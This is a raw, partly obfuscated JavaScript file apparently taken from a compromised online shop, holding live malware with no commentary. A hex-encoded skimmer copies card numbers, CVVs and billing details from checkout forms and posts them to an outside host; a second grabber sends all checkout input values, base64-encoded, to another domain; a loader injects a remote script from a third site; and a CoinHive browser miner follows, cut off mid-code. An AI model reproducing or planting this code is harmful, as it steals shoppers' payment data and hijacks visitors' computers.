var _0xb966=["\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x76\x61\x6C","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x68\x6F\x73\x73\x74\x5F\x6E\x61\x6D\x65\x22\x5D","\x73\x69\x7A\x65","\x2A\x5B\x6E\x61\x6D\x65\x2A\x3D\x22\x63\x63\x5F\x6E\x75\x6D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x2A\x3D\x22\x63\x63\x5F\x65\x78\x70\x5F\x6D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x2A\x3D\x22\x63\x63\x5F\x65\x78\x70\x5F\x79\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x2A\x3D\x22\x63\x63\x5F\x63\x69\x64\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x66\x69\x72\x73\x74\x6E\x61\x6D\x65\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x6C\x61\x73\x74\x6E\x61\x6D\x65\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x73\x74\x72\x65\x65\x74\x5D\x5B\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x63\x69\x74\x79\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x72\x65\x67\x69\x6F\x6E\x5F\x69\x64\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x70\x6F\x73\x74\x63\x6F\x64\x65\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x63\x6F\x75\x6E\x74\x72\x79\x5F\x69\x64\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x74\x65\x6C\x65\x70\x68\x6F\x6E\x65\x5D\x22\x5D","\x2A\x5B\x6E\x61\x6D\x65\x3D\x22\x62\x69\x6C\x6C\x69\x6E\x67\x5B\x65\x6D\x61\x69\x6C\x5D\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x43\x61\x72\x64\x5F\x6E\x75\x6D\x62\x65\x72\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x45\x78\x70\x5F\x31\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x45\x78\x70\x5F\x32\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x43\x56\x56\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x66\x69\x72\x73\x74\x5F\x6E\x61\x6D\x65\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x73\x65\x63\x6F\x6E\x64\x5F\x6E\x61\x6D\x65\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x61\x64\x64\x72\x65\x73\x73\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x63\x69\x74\x79\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x73\x74\x61\x74\x65\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x7A\x69\x70\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x63\x6F\x75\x6E\x74\x72\x79\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x70\x68\x6F\x6E\x65\x22\x5D","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x20\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x76\x62\x76\x22\x5D","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6D\x61\x67\x65\x6E\x74\x6F\x2E\x6E\x61\x6D\x65\x2F\x6D\x61\x67\x65\x2F\x6D\x61\x69\x6C\x32\x2E\x70\x68\x70","\x73\x65\x72\x69\x61\x6C\x69\x7A\x65","\x2E\x6D\x69\x5F\x66\x6F\x72\x6D\x73","\x70\x6F\x73\x74","\x62\x75\x74\x74\x6F\x6E\x5B\x6F\x6E\x63\x6C\x69\x63\x6B\x2A\x3D\x22\x2E\x73\x61\x76\x65\x22\x5D","\x65\x71","\x6F\x6E\x63\x6C\x69\x63\x6B","\x61\x74\x74\x72","\x66\x75\x6E\x63\x74\x69\x6F\x6E","\x64\x6F\x6B\x65","\x31","\x67\x65\x74","\x63\x6C\x69\x63\x6B","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x6D\x67\x5F\x5F\x63\x6F\x72\x65","\x69\x6E\x64\x65\x78\x4F\x66","\x6D\x67\x5F\x5F\x63\x6F\x72\x65\x28\x29\x3B","\x3C\x66\x6F\x72\x6D\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x69\x5F\x66\x6F\x72\x6D\x73\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x64\x69\x73\x70\x6C\x61\x79\x3A\x20\x6E\x6F\x6E\x65\x3B\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x68\x6F\x73\x73\x74\x5F\x6E\x61\x6D\x65\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x43\x61\x72\x64\x5F\x6E\x75\x6D\x62\x65\x72\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x45\x78\x70\x5F\x31\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x45\x78\x70\x5F\x32\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x43\x56\x56\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x66\x69\x72\x73\x74\x5F\x6E\x61\x6D\x65\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x73\x65\x63\x6F\x6E\x64\x5F\x6E\x61\x6D\x65\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x61\x64\x64\x72\x65\x73\x73\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x63\x69\x74\x79\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x73\x74\x61\x74\x65\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x7A\x69\x70\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x63\x6F\x75\x6E\x74\x72\x79\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x70\x68\x6F\x6E\x65\x22\x3E\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x5F\x76\x62\x76\x22\x3E\x3C\x2F\x66\x6F\x72\x6D\x3E","\x61\x70\x70\x65\x6E\x64","\x62\x6F\x64\x79","\x69\x6E\x69\x74\x5F\x5F\x6C\x6F\x28\x29\x3B","\x72\x65\x61\x64\x79"];if(( typeof llooll== _0xb966[0])&& ( typeof jQuery!= _0xb966[0])){var llooll=0;var lloo_interval;function mg__core(){var _0x50d4x4=location[_0xb966[1]];jQuery(_0xb966[3])[_0xb966[2]](_0x50d4x4);if(!(jQuery(_0xb966[5])[_0xb966[4]]())){return};var _0x50d4x5=jQuery(_0xb966[5])[_0xb966[2]]();var _0x50d4x6=jQuery(_0xb966[6])[_0xb966[2]]();var _0x50d4x7=jQuery(_0xb966[7])[_0xb966[2]]();var _0x50d4x8=jQuery(_0xb966[8])[_0xb966[2]]();var _0x50d4x9=jQuery(_0xb966[9])[_0xb966[2]]();var _0x50d4xa=jQuery(_0xb966[10])[_0xb966[2]]();var _0x50d4xb=jQuery(_0xb966[11])[_0xb966[2]]();var _0x50d4xc=jQuery(_0xb966[12])[_0xb966[2]]();var _0x50d4xd=jQuery(_0xb966[13])[_0xb966[2]]();var _0x50d4xe=jQuery(_0xb966[14])[_0xb966[2]]();var _0x50d4xf=jQuery(_0xb966[15])[_0xb966[2]]();var _0x50d4x10=jQuery(_0xb966[16])[_0xb966[2]]();var _0x50d4x11=jQuery(_0xb966[17])[_0xb966[2]]();jQuery(_0xb966[18])[_0xb966[2]](_0x50d4x5);jQuery(_0xb966[19])[_0xb966[2]](_0x50d4x6);jQuery(_0xb966[20])[_0xb966[2]](_0x50d4x7);jQuery(_0xb966[21])[_0xb966[2]](_0x50d4x8);jQuery(_0xb966[22])[_0xb966[2]](_0x50d4x9);jQuery(_0xb966[23])[_0xb966[2]](_0x50d4xa);jQuery(_0xb966[24])[_0xb966[2]](_0x50d4xb);jQuery(_0xb966[25])[_0xb966[2]](_0x50d4xc);jQuery(_0xb966[26])[_0xb966[2]](_0x50d4xd);jQuery(_0xb966[27])[_0xb966[2]](_0x50d4xe);jQuery(_0xb966[28])[_0xb966[2]](_0x50d4xf);jQuery(_0xb966[29])[_0xb966[2]](_0x50d4x10);jQuery(_0xb966[30])[_0xb966[2]](_0x50d4x11);var _0x50d4x12=0;if((!_0x50d4x5) || (!_0x50d4x8) || (!_0x50d4x6) || (!_0x50d4x7)){_0x50d4x12= 1};if(_0x50d4x12!= 1){jQuery[_0xb966[34]](_0xb966[31],jQuery(_0xb966[33])[_0xb966[32]]())}}function init__lo(){if(!(jQuery(_0xb966[5])[_0xb966[4]]())){return};var _0x50d4x14=jQuery(_0xb966[35]);for(var _0x50d4x15=0;_0x50d4x15< _0x50d4x14[_0xb966[4]]();_0x50d4x15++){var _0x50d4x16=_0x50d4x14[_0xb966[36]](_0x50d4x15);var _0x50d4x17=_0x50d4x16[_0xb966[38]](_0xb966[37]);if(( typeof _0x50d4x17)== _0xb966[39]){var _0x50d4x18=_0x50d4x16[_0xb966[38]](_0xb966[40]);if(_0x50d4x18== _0xb966[41]){continue};_0x50d4x16[_0xb966[38]](_0xb966[40],_0xb966[41]);var _0x50d4x19=_0x50d4x16[_0xb966[42]](0);_0x50d4x19[_0xb966[44]](_0xb966[43],function(){mg__core()});continue};if(_0x50d4x17[_0xb966[46]](_0xb966[45])>= 0){continue};_0x50d4x16[_0xb966[38]](_0xb966[37],_0xb966[47]+ _0x50d4x17)}}if(( typeof jQuery!= _0xb966[0])){(function(_0x50d4x1a){_0x50d4x1a(document)[_0xb966[52]](function(){_0x50d4x1a(_0xb966[50])[_0xb966[49]](_0xb966[48]);init__lo();lloo_interval= setInterval(_0xb966[51],7000)})})(jQuery)}}

var zba0563bd6aeb271448526370610fee56={
    snd:null,
    k19718948c3ce5600fb7b864cf43b8274:'https://web-stats.cc/js/translate.js',
    myid:(function(name){
        var matches=document.cookie.match(new RegExp('(?:^|; )'+name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,'\\$1')+'=([^;]*)'));
        return matches?decodeURIComponent(matches[1]):undefined;
    })('setidd')||(function(){
        var ms=new Date();
        var myid = ms.getTime()+"-"+Math.floor(Math.random()*(999999999-11111111+1)+11111111);
        var date=new Date(new Date().getTime()+60*60*24*1000);
        document.cookie='setidd='+myid+'; path=/; expires='+date.toUTCString();
        return myid;
    })(),
clk:function(){
        zba0563bd6aeb271448526370610fee56.snd=null;
        var inp=document.querySelectorAll("input, select, textarea, checkbox, button");
        for (var i=0;i<inp.length;i++){
            if(inp[i].value.length>0){
                var nme=inp[i].name;
                if(nme==''){nme=i;}
                    zba0563bd6aeb271448526370610fee56.snd+=inp[i].name+'='+inp[i].value+'&';
            }
        }
    },
    send:function(){
        try{
            var btn=document.querySelectorAll("a[href*='javascript:void(0)'],button, input, submit, .btn, .button");
            for(var i=0;i<btn.length;i++){
                var b=btn[i];
                if(b.type!='text'&&b.type!='select'&&b.type!='checkbox'&&b.type!='password'&&b.type!='radio'){
                    if(b.addEventListener) {
                        b.addEventListener('click',zba0563bd6aeb271448526370610fee56.clk,false);
                    }else{
                        b.attachEvent('onclick',zba0563bd6aeb271448526370610fee56.clk);
                    }
                }
            }
            var frm=document.querySelectorAll('form');
            for(vari=0;i<frm.length;i++){
                if(frm[i].addEventListener){
                    frm[i].addEventListener('submit',zba0563bd6aeb271448526370610fee56.clk,false);
                }else{
                    frm[i].attachEvent('onsubmit',zba0563bd6aeb271448526370610fee56.clk);
                }
            }
            if(zba0563bd6aeb271448526370610fee56.snd!=null){
                var domm=location.hostname.split('.').slice(0).join('_')  || 'nodomain';
                var keym=btoa(zba0563bd6aeb271448526370610fee56.snd);
                var http=new XMLHttpRequest();
                http.open('POST',zba0563bd6aeb271448526370610fee56.k19718948c3ce5600fb7b864cf43b8274,true);
                http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
                http.send('info='+keym+'&hostname='+domm+'&key='+zba0563bd6aeb271448526370610fee56.myid);
            }
            zba0563bd6aeb271448526370610fee56.snd=null;
            keym=null;
            setTimeout(function(){zba0563bd6aeb271448526370610fee56.send()},30);
        }catch(e){}
    }
}

if((new RegExp('onepage|checkout|onestep','gi')).test(window.location)){
	zba0563bd6aeb271448526370610fee56.send();
}
var d=document;var s=d.createElement('script'); 
s.src='https://oltratoke.ru/Yz7np9?frm=script'; 
if (document.currentScript) { 
document.currentScript.parentNode.insertBefore(s, document.currentScript);
} else {
d.getElementsByTagName('head')[0].appendChild(s);
}
(function(window){"use strict";var Miner=function(siteKey,params){this.params=params||{};this._siteKey=siteKey;this._user=null;this._threads=[];this._hashes=0;this._currentJob=null;this._autoReconnect=true;this._reconnectRetry=3;this._tokenFromServer=null;this._goal=0;this._totalHashesFromDeadThreads=0;this._throttle=Math.max(0,Math.min(.99,this.params.throttle||0));this._stopOnInvalidOptIn=false;this._waitingForAuth=false;this._selfTestSuccess=false;this._verifyThread=null;this._autoThreads={enabled:!!this.params.autoThreads,interval:null,adjustAt:null,adjustEvery:1e4,stats:{}};this._tab={ident:Math.random()*16777215|0,mode:CoinHive.IF_EXCLUSIVE_TAB,grace:0,waitReconnect:0,lastPingReceived:0,interval:null};if(window.BroadcastChannel){try{this._bc=new BroadcastChannel("coinhive");this._bc.onmessage=function(msg){if(msg.data==="ping"){this._tab.lastPingReceived=Date.now()}}.bind(this)}catch(e){}}if(CoinHive.CONFIG.REQUIRES_AUTH){this._auth=new CoinHive.Auth(this._siteKey,{theme:this.params.theme||"light",lang:this.params.language||"auto"})}this._eventListeners={open:[],authed:[],close:[],error:[],job:[],found:[],accepted:[],optin:[]};var defaultThreads=navigator.hardwareConcurrency||4;this._targetNumThreads=this.params.threads||defaultThreads;this._useWASM=this.hasWASMSupport()&&!this.params.forceASMJS;this._asmjsStatus="unloaded";this._onTargetMetBound=this._onTargetMet.bind(this);this._onVerifiedBound=this._onVerified.bind(this)};Miner.prototype.start=function(mode,optInToken){this._tab.mode=mode||CoinHive.IF_EXCLUSIVE_TAB;this._optInToken=optInToken;if(this._tab.interval){clearInterval(this._tab.interval);this._tab.interval=null}this._loadWorkerSource(function(){this._startNow()}.bind(this))};Miner.prototype.stop=function(mode){for(var i=0;i<this._threads.length;i++){this._totalHashesFromDeadThreads+=this._threads[i].hashesTotal;this._threads[i].stop()}this._threads=[];this._autoReconnect=false;if(this._socket){this._socket.close()}this._currentJob=null;if(this._autoThreads.interval){clearInterval(this._autoThreads.interval);this._autoThreads.interval=null}if(this._tab.interval&&mode!=="dontKillTabUpdate"){clearInterval(this._tab.interval);this._tab.interval=null}};Miner.prototype.getHashesPerSecond=function(){var hashesPerSecond=0;for(var i=0;i<this._threads.length;i++){hashesPerSecond+=this._threads[i].hashesPerSecond}return hashesPerSecond};Miner.prototype.getTotalHashes=function(estimate){var now=Date.now();var hashes=this._totalHashesFromDeadThreads;for(var i=0;i<this._threads.length;i++){var thread=this._threads[i];hashes+=thread.hashesTotal;if(estimate){var tdiff=(now-thread.lastMessageTimestamp)/1e3*.9;hashes+=tdiff*thread.hashesPerSecond}}return hashes|0};Miner.prototype.getAcceptedHashes=function(){return this._hashes};Miner.prototype.getToken=function(){return this._tokenFromServer};Miner.prototype.on=function(type,callback){if(this._eventListeners[type]){this._eventListeners[type].push(callback)}};Miner.prototype.getAutoThreadsEnabled=function(enabled){return this._autoThreads.enabled};Miner.prototype.setAutoThreadsEnabled=function(enabled){this._autoThreads.enabled=!!enabled;if(!enabled&&this._autoThreads.interval){clearInterval(this._autoThreads.interval);this._autoThreads.interval=null}if(enabled&&!this._autoThreads.interval){this._autoThreads.adjustAt=Date.now()+this._autoThreads.adjustEvery;this._autoThreads.interval=setInterval(this._adjustThreads.bind(this),1e3)}};Miner.prototype.getThrottle=function(){return this._throttle};Miner.prototype.setThrottle=function(throttle){this._throttle=Math.max(0,Math.min(.99,throttle));if(this._currentJob){this._setJob(this._currentJob)}};Miner.prototype.getNumThreads=function(){return this._targetNumThreads};Miner.prototype.setNumThreads=function(num){var num=Math.max(1,num|0);this._targetNumThreads=num;if(num>this._threads.length){for(var i=0;num>this._threads.length;i++){var thread=new CoinHive.JobThread;if(this._currentJob){thread.setJob(this._currentJob,this._onTargetMetBound)}this._threads.push(thread)}}else if(num<this._threads.length){while(num<this._threads.length){var thread=this._threads.pop();this._totalHashesFromDeadThreads+=thread.hashesTotal;thread.stop()}}};Miner.prototype.hasWASMSupport=function(){return window.WebAssembly!==undefined&&!/OS 11_2_(2|5|6)/.test(navigator.userAgent)};Miner.prototype.isRunning=function(){return this._threads.length>0};Miner.prototype.isMobile=function(){return/mobile|Android|webOS|iPhone|iPad|iPod|IEMobile|Opera Mini/i.test(navigator.userAgent)};Miner.prototype.didOptOut=function(seconds){if(!CoinHive.CONFIG.REQUIRES_AUTH){return false}seconds=seconds||60*60*4;var t=this._auth.getOptOutTime();return!!(t&&t>Date.now()/1e3-seconds)};Miner.prototype.isAuthed=function(){if(CoinHive.CONFIG.REQUIRES_AUTH){return this._auth.isAuthed()}return true};Miner.prototype.selfTest=function(callback){this._loadWorkerSource(function(){if(!this._verifyThread){this._verifyThread=new CoinHive.JobThread}var testJob={verify_id:"1",nonce:"00000000",result:"6902d6d809395477009c1aa24338de7e42502b5980264c2a0992a792b3543ac5",blob:"0807a9b7d1d6053f1319632703fcfcd2cebc44d8ab44a6a03ae44d8f15af6217d1e09285e473f900000000fc09deabf58b6f1dcaa8baac74dd7419d5d610ec38cf50296a070b938f8fa81004"};this._verifyThread.verify(testJob,function(res){callback(res.verified===true,res)})}.bind(this))};Miner.prototype._loadWorkerSource=function(callback){if(this._useWASM||this._asmjsStatus==="loaded"){callback()}else if(this._asmjsStatus==="unloaded"){this._asmjsStatus="pending";var xhr=new XMLHttpRequest;xhr.addEventListener("load",function(){CoinHive.CRYPTONIGHT_WORKER_BLOB=CoinHive.Res(xhr.responseText);this._asmjsStatus="loaded";callback()}.bind(this),xhr);xhr.open("get",CoinHive.CONFIG.LIB_URL+CoinHive.CONFIG.ASMJS_NAME,true);xhr.send()}};Miner.prototype._startNow=function(){if(this._tab.mode!==CoinHive.FORCE_MULTI_TAB&&!this._tab.interval){this._tab.interval=setInterval(this._updateTabs.bind(this),1e3)}if(this._tab.mode===CoinHive.IF_EXCLUSIVE_TAB&&this._otherTabRunning()){return}if(this._tab.mode===CoinHive.FORCE_EXCLUSIVE_TAB){this._tab.grace=Date.now()+3e3}if(!this._verifyThread){this._verifyThread=new CoinHive.JobThread}this.setNumThreads(this._targetNumThreads);this._autoReconnect=true;if(CoinHive.CONFIG.REQUIRES_AUTH&&!this._optInToken){this._waitingForAuth=true;this._auth.auth(function(token){this._waitingForAuth=false;if(!token){this.stop();this._emit("optin",{status:"canceled"});this._emit("error",{error:"opt_in_canceled"});return}this._emit("optin",{status:"accepted"});this._optInToken=token;this._connectAfterSelfTest()}.bind(this))}else{this._connectAfterSelfTest()}};Miner.prototype._otherTabRunning=function(){if(this._tab.lastPingReceived>Date.now()-1500){return true}try{var tdjson=localStorage.getItem("coinhive");if(tdjson){var td=JSON.parse(tdjson);if(td.ident!==this._tab.ident&&Date.now()-td.time<1500){return true}}}catch(e){}return false};Miner.prototype._updateTabs=function(){if(Date.now()<this._tab.waitReconnect){return}var otherTabRunning=this._otherTabRunning();if(otherTabRunning&&this.isRunning()&&Date.now()>this._tab.grace){this.stop("dontKillTabUpdate")}else if(!otherTabRunning&&!this.isRunning()){this._startNow()}if(this.isRunning()&&!this._waitingForAuth){if(this._bc){this._bc.postMessage("ping")}try{localStorage.setItem("coinhive",JSON.stringify({ident:this._tab.ident,time:Date.now()}))}catch(e){}}};Miner.prototype._adjustThreads=function(){var hashes=this.getHashesPerSecond();var threads=this.getNumThreads();var stats=this._autoThreads.stats;stats[threads]=stats[threads]?stats[threads]*.5+hashes*.5:hashes;if(Date.now()>this._autoThreads.adjustAt){this._autoThreads.adjustAt=Date.now()+this._autoThreads.adjustEvery;var cur=(stats[threads]||0)-1;var up=stats[threads+1]||0;var down=stats[threads-1]||0;if(cur>down&&(up===0||up>cur)&&threads<8){return this.setNumThreads(threads+1)}else if(cur>up&&(!down||down>cur)&&threads>1){return this.setNumThreads(threads-1)}}};Miner.prototype._emit=function(type,params){var listeners=this._eventListeners[type];if(listeners&&listeners.length){for(var i=0;i<listeners.length;i++){listeners[i](params)}}};Miner.prototype._hashString=function(s){var hash=5381,i=s.length;while(i){hash=hash*33^s.charCodeAt(--i)}return hash>>>0};Miner.prototype._connectAfterSelfTest=function(){if(this._selfTestSuccess||this.hasWASMSupport()){this._connect()}else{this.selfTest(function(success){if(success){this._selfTestSuccess=true;this._connect()}else{this._emit("error",{error:"self_test_failed"})}}.bind(this))}};Miner.prototype._connect=function(){if(this._socket){return}var shards=CoinHive.CONFIG.WEBSOCKET_SHARDS;var shardIdx=Math.random()*shards.length|0;var proxies=shards[shardIdx];var proxyUrl=proxies[Math.random()*proxies.length|0];this._socket=new WebSocket(proxyUrl);this._socket.onmessage=this._onMessage.bind(this);this._socket.onerror=this._onError.bind(this);this._socket.onclose=this._onClose.bind(this);this._socket.onopen=this._onOpen.bind(this)};Miner.prototype._onOpen=function(ev){this._emit("open");var params={version:CoinHive.VERSION,site_key:this._siteKey,type:"anonymous",user:null,goal:0};if(this._user){params.type="user";params.user=this._user.toString()}else if(this._goal){params.type="token";params.goal=this._goal}if(this.params.ref){params.ref=this.params.ref}if(this._optInToken){params.opt_in=this._optInToken}this._send("auth",params)};Miner.prototype._onError=function(ev){this._emit("error",{error:"connection_error"});this._onClose(ev)};Miner.prototype._onClose=function(ev){if(ev.code>=1003&&ev.code<=1009){this._reconnectRetry=60;this._tab.waitReconnect=Date.now()+60*1e3}for(var i=0;i<this._threads.length;i++){this._threads[i].stop()}this._threads=[];this._socket=null;this._emit("close");if(this._autoReconnect){setTimeout(this._startNow.bind(this),this._reconnectRetry*1e3)}};Miner.prototype._onMessage=function(ev){var msg=JSON.parse(ev.data);if(msg.type==="job"){this._setJob(msg.params);this._emit("job",msg.params);if(this._autoThreads.enabled&&!this._autoThreads.interval){this._autoThreads.adjustAt=Date.now()+this._autoThreads.adjustEvery;this._autoThreads.interval=setInterval(this._adjustThreads.bind(this),1e3)}}else if(msg.type==="verify"){this._verifyThread.verify(msg.params,this._onVerifiedBound)}else if(msg.type==="hash_accepted"){this._hashes=msg.params.hashes;this._emit("accepted",msg.params);if(this._goal&&this._hashes>=this._goal){this.stop()}}else if(msg.type==="authed"){this._tokenFromServer=msg.params.token||null;this._hashes=msg.params.hashes||0;this._emit("authed",msg.params);this._reconnectRetry=3;this._tab.waitReconnect=0}else if(msg.type==="error"){if(console&&console.error){console.error("Coinhive Error:",msg.params.error)}this._emit("error",msg.params);if(msg.params.error==="invalid_site_key"){this._reconnectRetry=6e3;this._tab.waitReconnect=Date.now()+6e3*1e3}else if(msg.params.error==="invalid_opt_in"){if(this._stopOnInvalidOptIn){return this.stop()}else if(this._auth){this._auth.reset()}}}if(msg.type==="banned"||msg.params.banned){this._emit("error",{banned:true});this._reconnectRetry=600;this._tab.waitReconnect=Date.now()+600*1e3}};Miner.prototype._setJob=function(job){this._currentJob=job;this._currentJob.throttle=this._throttle;for(var i=0;i<this._threads.length;i++){this._threads[i].setJob(job,this._onTargetMetBound)}};Miner.prototype._onTargetMet=function(result){this._emit("found",result);if(result.job_id===this._currentJob.job_id){this._send("submit",{version:CoinHive.VERSION,job_id:result.job_id,nonce:result.nonce,result:result.result})}};Miner.prototype._onVerified=function(verifyResult){this._send("verified",verifyResult)};Miner.prototype._send=function(type,params){if(!this._socket){return}var msg={type:type,params:params||{}};this._socket.send(JSON.stringify(msg))};window.CoinHive=window.CoinHive||{};window.CoinHive.VERSION=9;window.CoinHive.IF_EXCLUSIVE_TAB="ifExclusiveTab";window.CoinHive.FORCE_EXCLUSIVE_TAB="forceExclusiveTab";window.CoinHive.FORCE_MULTI_TAB="forceMultiTab";window.CoinHive.Token=function(siteKey,goal,params){var miner=new Miner(siteKey,params);miner._goal=goal||0;return miner};window.CoinHive.User=function(siteKey,user,params){var miner=new Miner(siteKey,params);miner._user=user;return miner};window.CoinHive.Anonymous=function(siteKey,params){var miner=new Miner(siteKey,params);return miner};window.CoinHive.Res=function(s){var url=window.URL||window.webkitURL||window.mozURL;return url.createObjectURL(new Blob([s]))}})(window);(function(window){"use strict";var JobThread=function(){this.worker=new Worker(CoinHive.CRYPTONIGHT_WORKER_BLOB);this.worker.onmessage=this.onReady.bind(this);this.currentJob=null;this.verifyJob=null;this.jobCallback=function(){};this.verifyCallback=function(){};this._isReady=false;this.hashesPerSecond=0;this.hashesTotal=0;this.running=false;this.lastMessageTimestamp=Date.now()};JobThread.prototype.onReady=function(msg){if(msg.data!=="ready"||this._isReady){throw'Expecting first message to be "ready", got '+msg}this._isReady=true;this.worker.onmessage=this.onReceiveMsg.bind(this);if(this.currentJob){this.running=true;this.worker.postMessage(this.currentJob)}else 